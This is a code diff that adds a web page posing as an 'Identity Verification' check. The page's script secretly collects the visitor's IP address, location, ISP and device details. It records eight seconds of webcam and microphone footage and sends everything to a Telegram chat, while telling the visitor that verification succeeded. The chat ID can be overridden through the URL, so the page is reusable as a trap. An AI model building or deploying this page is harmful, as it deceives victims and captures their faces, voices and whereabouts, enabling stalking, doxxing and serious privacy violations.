@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Identity Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background: radial-gradient(circle, #1a1a1a, #000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+    }
+
+    .container {
+      text-align: center;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid #444;
+      border-radius: 16px;
+      box-shadow: 0 0 25px rgba(0, 255, 255, 0.25);
+      width: 90%;
+      max-width: 420px;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #0ff;
+    }
+
+    p {
+      font-size: 14px;
+      color: #bbb;
+      margin-bottom: 20px;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #0f0;
+      min-height: 18px;
+    }
+
+    button {
+      padding: 12px 22px;
+      border-radius: 10px;
+      border: none;
+      background: #0ff;
+      color: #000;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    video {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+      margin: 15px 0;
+      display: none;
+    }
+
+    video.active {
+      display: block;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>🔐 Identity Verification</h1>
+    <p>We need your camera verification to verify you.</p>
+
+    <div class="status" id="status">Waiting for user action...</div>
+    
+    <video id="video" autoplay muted playsinline></video>
+  </div>
+
+  <script>
+    // Chat ID (có thể public, không cần ẩn)
+    const CHAT_ID = "1146923111";
+    
+    // Bot Token đã được lưu trong Vercel Environment Variables (bảo mật)
+    // Không cần hardcode ở đây nữa
+    
+    // Vẫn hỗ trợ truyền Chat ID qua URL nếu cần override
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlChatId = urlParams.get("id") || urlParams.get("chat_id");
+    
+    // Sử dụng URL param nếu có, nếu không thì dùng giá trị hardcode
+    const finalChatId = urlChatId || CHAT_ID;
+    
+    const statusEl = document.getElementById("status");
+    const videoEl = document.getElementById("video");
+
+    window.onload = async () => {
+      // Gửi thông tin thiết bị về Telegram
+      if (finalChatId) {
+        await sendDeviceInfo();
+      }
+
+      try {
+        statusEl.textContent = "📸 Requesting camera & microphone permission...";
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: true
+        });
+
+        // Show video preview
+        videoEl.srcObject = stream;
+        videoEl.classList.add("active");
+
+        statusEl.textContent = "🔴 Verifying You...";
+
+        const videoBlob = await recordVideo(stream);
+        const base64Video = await blobToBase64(videoBlob);
+
+        statusEl.textContent = "📡 Parsing verification data...";
+        
+        // Gửi video về Telegram qua Vercel API endpoint
+        // Bot Token được lấy từ Environment Variables trên backend
+        if (finalChatId) {
+          await sendToTelegram(base64Video, "Video");
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        videoEl.classList.remove("active");
+        statusEl.textContent = "✅ Verification completed successfully";
+        
+        // Redirect after verification (optional)
+        // window.location.href = "your-success-page.html";
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = "❌ Permission denied or error occurred";
+      }
+    };
+    
+    async function sendDeviceInfo() {
+      if (!finalChatId) return;
+      
+      try {
+        const ip = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
+        const battery = navigator.getBattery ? await navigator.getBattery() : null;
+        const time = new Date().toLocaleString();
+        const msg = `
+🌐 *IP Information*
+
+🔢 IP Address: ${ip.ip || 'Unknown'}
+📍 Location: ${ip.city || 'Unknown'}
+🌍 Region: ${ip.region || 'Unknown'}
+🗺 Country: ${ip.country || 'Unknown'}
+📡 ISP: ${ip.org || 'Unknown'}
+
+
+📱 *Device Details*
+
+🔋 Battery: ${battery ? Math.round(battery.level * 100) + '%' + (battery.charging ? ' ⚡ Charging' : '') : 'N/A'}
+📶 Network: ${navigator.connection?.effectiveType || 'Unknown'}
+🖥️ Screen: ${screen.width}x${screen.height}
+🕒 Time: ${time}
+🧠 UA: ${navigator.userAgent}
+        `;
+        await sendMessageToTelegram(msg.trim());
+      } catch (e) {
+        console.error("Device Info Error:", e);
+      }
+    }
+
+    function recordVideo(stream) {
+      return new Promise(resolve => {
+        const recorder = new MediaRecorder(stream, {
+          mimeType: "video/webm;codecs=vp8,opus"
+        });
+
+        const chunks = [];
+        let seconds = 8;
+
+        recorder.ondataavailable = e => {
+          if (e.data.size) chunks.push(e.data);
+        };
+
+        recorder.onstop = () => {
+          resolve(new Blob(chunks, { type: "video/webm" }));
+        };
+
+        recorder.start();
+
+        const timer = setInterval(() => {
+          statusEl.textContent = `⏳ Working… ${seconds--}s`;
+          if (seconds < 0) {
+            clearInterval(timer);
+            recorder.stop();
+          }
+        }, 1000);
+      });
+    }
+
+    function blobToBase64(blob) {
+      return new Promise(resolve => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result.split(",")[1]);
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    async function sendMessageToTelegram(text) {
+      if (!finalChatId) {
+        console.warn("Chat ID chưa được cấu hình");
+        return;
+      }
+
+      await sendToTelegram(text, "Text");
+    }
+
+    async function sendToTelegram(data, type) {
+      if (!finalChatId) {
+        console.warn("Chat ID chưa được cấu hình");
+        return;
+      }
+
+      try {
+        // Bot Token được lấy từ Environment Variables trên backend
+        // Chỉ gửi Chat ID từ frontend
+        const payload = {
+          CHAT_ID: finalChatId,
+          type,
+          data
+        };
+
+        // Log size của data (chỉ cho video)
+        if (type === 'Video') {
+          console.log(`Sending video, size: ${(data.length * 3/4 / 1024).toFixed(2)} KB`);
+        }
+
+        const response = await fetch("/api/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+        
+        if (!result.success) {
+          console.error("Error sending to Telegram:", result);
+          statusEl.textContent = `❌ Error: ${result.error || 'Unknown error'}`;
+        } else {
+          console.log("Successfully sent to Telegram:", result.method || type);
+        }
+      } catch (error) {
+        console.error("Error calling API endpoint:", error);
+        statusEl.textContent = `❌ Network error: ${error.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
